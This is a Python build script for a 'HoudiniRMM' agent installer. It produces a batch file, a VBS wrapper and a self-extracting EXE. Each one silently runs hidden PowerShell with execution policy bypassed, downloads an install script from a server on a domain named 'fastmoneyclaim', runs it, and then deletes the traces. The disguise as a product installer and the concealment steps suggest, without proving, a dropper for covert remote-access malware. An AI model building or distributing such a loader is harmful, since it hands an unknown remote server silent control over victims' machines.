#!/usr/bin/env python3
"""
Build a silent MSI/EXE installer for HoudiniRMM agent.
Generates a self-extracting executable that runs the PowerShell one-liner silently.
"""

import os
import sys
import shutil
import subprocess
import tempfile
from pathlib import Path

PRODUCT_NAME = "HoudiniRMM"
PRODUCT_VERSION = "1.0.0"
MANUFACTURER = "HoudiniRMM"
SERVER_URL = "https://rmm.houdini.fastmoneyclaim.com"
INSTALL_SCRIPT_URL = f"{SERVER_URL}/dashboard/api/install-script"


def create_batch_wrapper():
    return f'''@echo off
setlocal enabledelayedexpansion
echo Installing HoudiniRMM Agent...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -UseBasicParsing '{INSTALL_SCRIPT_URL}' -OutFile $env:TEMP\\install.ps1; & $env:TEMP\\install.ps1 }}"
timeout /t 5 /nobreak >nul 2>&1
if exist "%TEMP%\\install.ps1" del /q "%TEMP%\\install.ps1" 2>nul
if exist "%TEMP%\\rmm-package.zip" del /q "%TEMP%\\rmm-package.zip" 2>nul
if exist "%TEMP%\\rmm-extract" rmdir /s /q "%TEMP%\\rmm-extract" 2>nul
echo Installation completed.
'''


def create_vbs_wrapper():
    return f"""' HoudiniRMM Silent Agent Installer
CreateObject("WScript.Shell").Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -UseBasicParsing '{INSTALL_SCRIPT_URL}' -OutFile $env:TEMP\\install.ps1; & $env:TEMP\\install.ps1 }}""", 0, False
"""


def build_self_extracting_exe(output_dir=".", product_name=PRODUCT_NAME, product_version=PRODUCT_VERSION):
    print("[*] Building self-extracting EXE using IExpress...")
    temp_dir = Path(tempfile.mkdtemp(prefix="rmm_installer_"))
    try:
        install_cmd = temp_dir / "install.cmd"
        install_cmd.write_text(create_batch_wrapper(), encoding="ascii")
        sed_content = f'''[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=Installation complete.
TargetName={product_name}-Installer.exe
FriendlyName={product_name} Agent Installer
AppLaunched=install.cmd
PostInstallCmd=<None>
AdminQuietInstCmd=
UserQuietInstCmd=
'''
        sed_file = temp_dir / "install.sed"
        sed_file.write_text(sed_content, encoding="ascii")
        iexpress = Path(os.environ.get("SystemRoot", "C:\\Windows")) / "System32" / "iexpress.exe"
        if not iexpress.exists():
            print("[!] IExpress not found. Creating batch file instead...")
            return build_batch_installer(output_dir, product_name, product_version)
        print("[*] Running IExpress...")
        subprocess.run([str(iexpress), "/N", "/Q", "/M", str(sed_file)], cwd=temp_dir, capture_output=True)
        exe_files = list(temp_dir.glob("*.exe"))
        if exe_files:
            exe_file = exe_files[0]
            output_file = Path(output_dir) / f"{product_name}-Installer-{product_version}.exe"
            shutil.copy2(exe_file, output_file)
            print(f"[+] EXE built: {output_file}")
            print(f"[+] Size: {output_file.stat().st_size / 1024:.2f} KB")
            return str(output_file)
        else:
            return build_batch_installer(output_dir, product_name, product_version)
    except Exception as e:
        print(f"[!] Error: {e}")
        return build_batch_installer(output_dir, product_name, product_version)
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def build_batch_installer(output_dir=".", product_name=PRODUCT_NAME, product_version=PRODUCT_VERSION):
    print("[*] Building batch installer...")
    bat_content = create_batch_wrapper()
    bat_output = Path(output_dir) / f"{product_name}-Installer-{product_version}.bat"
    bat_output.write_text(bat_content, encoding="ascii")
    print(f"[+] Batch file: {bat_output}")
    vbs_output = Path(output_dir) / f"{product_name}-Installer-{product_version}.vbs"
    vbs_output.write_text(create_vbs_wrapper(), encoding="ascii")
    print(f"[+] VBS wrapper: {vbs_output}")
    return str(bat_output)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Build HoudiniRMM silent installer")
    parser.add_argument("-o", "--output", default=".", help="Output directory")
    parser.add_argument("-n", "--name", default=PRODUCT_NAME, help="Product name")
    parser.add_argument("-v", "--version", default=PRODUCT_VERSION, help="Product version")
    parser.add_argument("--exe", action="store_true", help="Build EXE installer")
    parser.add_argument("--all", action="store_true", help="Build all installers")
    args = parser.parse_args()
    product_name = args.name
    product_version = args.version
    output_dir = args.output
    os.makedirs(output_dir, exist_ok=True)
    print("=" * 60)
    print(f"  {product_name} Agent Installer Builder")
    print(f"  Version: {product_version}")
    print("=" * 60)
    if args.all:
        build_self_extracting_exe(output_dir, product_name, product_version)
        build_batch_installer(output_dir, product_name, product_version)
    else:
        build_self_extracting_exe(output_dir, product_name, product_version)


if __name__ == "__main__":
    main()
